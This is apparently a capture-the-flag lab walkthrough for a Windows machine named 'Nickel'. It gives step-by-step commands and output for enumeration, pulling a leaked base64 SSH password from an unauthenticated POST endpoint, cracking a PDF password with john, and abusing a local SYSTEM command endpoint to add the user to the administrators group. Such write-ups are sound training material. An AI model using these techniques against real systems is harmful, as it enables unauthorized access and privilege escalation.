##### Tags: `curl`  `pdf2john`  `user add` `URL encode decode` `POST`

# 🪟 Nickel 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.174.99                                        

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5040/tcp  open  unknown
7680/tcp  open  tcpwrapped
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 21 anonymous login failed  
port 135,139,445 rpc and smb checked and nothing interested  
port 3389 RDP no credential  
port 5040,7680 unable to connect  
when i tried to curl the port 8089, there are three Endpoints  
and redirect us to port 33333
```console
$ curl http://192.168.174.99:8089 
<h1>DevOps Dashboard</h1>
<hr>
<form action='http://169.254.144.247:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.144.247:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.144.247:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>
```
curl the endpoint with port 33333  
we can see GET method is not allowed
```console
$ curl -i http://192.168.174.99:33333/list-running-procs 
HTTP/1.1 200 OK
Content-Length: 39
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 30 Mar 2026 03:41:04 GMT

<p>Cannot "GET" /list-running-procs</p> 
```
try POST method and it requires content length
```console
$ curl -i http://192.168.174.99:33333/list-running-procs -X POST
HTTP/1.1 411 Length Required
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 30 Mar 2026 03:42:44 GMT
Connection: close
Content-Length: 344

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Length Required</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Length Required</h2>
<hr><p>HTTP Error 411. The request must be chunked or have a content length.</p>
</BODY></HTML>
```
add the content length and we can see the username and password
```console
─$ curl -i http://192.168.174.99:33333/list-running-procs -X POST -H 'content-length: 0'
HTTP/1.1 200 OK
Content-Length: 3347
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 30 Mar 2026 03:44:24 GMT

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

```
the password seems encoded  
so we use https://toolbox.googleapps.com/apps/encode_decode/  
use base64 decoder and got the password
```console
NowiseSloopTheory139
```
ssh to login as ariah
```console
$ ssh ariah@192.168.174.99
ariah@192.168.174.99's password: 
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

ariah@NICKEL C:\Users\ariah>whoami
nickel\ariah
```
## Privilege Escalation
there is a suspicious file is ftp folder
```console
ariah@NICKEL C:\>dir                                                                                                                
09/01/2020  12:38 PM    <DIR>          ftp                
    
ariah@NICKEL C:\ftp>dir
09/01/2020  11:02 AM            46,235 Infrastructure.pdf
```
transfer to our local machine and found the file is password protected  
so we crack it with pdfjohn
```console
$ pdf2john Infrastructure.pdf > pdf.hash 
```
we got the password
```console
$ john --wordlist=/home/ming/Downloads/rockyou.txt pdf.hash              
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
No password hashes left to crack (see FAQ)

$ john --show pdf.hash
Infrastructure.pdf:ariah4168
```
open the pdf with the password 
```console
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```
looks like its a RCE in the machine  
check what service is running
```console
ariah@NICKEL C:\ftp>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    127.0.0.1:80           0.0.0.0:0              LISTENING       4
```
we found there is a web service is running locally with system
use the RCE in pdf and confirmed we have RCE with system
```console
ariah@NICKEL C:\ftp>curl http://127.0.0.1/?whoami
<!doctype html><html><body>dev-api started at 2025-12-07T05:47:35

        <pre>nt authority\system
</pre>
</body></html>
```
we can add ourself to administrators group  
since this is web service we need to URL encode the command
```console
#original command

curl http://127.0.0.1/?net localgroup administrators ariah /add
```
```console
#URL encoded command

ariah@NICKEL C:\Users\ariah>curl "http://127.0.0.1/?net%20localgroup%20administrators%20ariah%20/add"
<!doctype html><html><body>dev-api started at 2025-12-07T05:47:35

        <pre>The command completed successfully.

</pre>
</body></html>
```
logout and login again  
confirmed we are in administrators group
```console
ariah@NICKEL C:\>net user ariah
User name                    ariah
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/1/2020 12:38:26 PM
Password expires             Never
Password changeable          9/1/2020 12:38:26 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/29/2026 8:48:06 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```
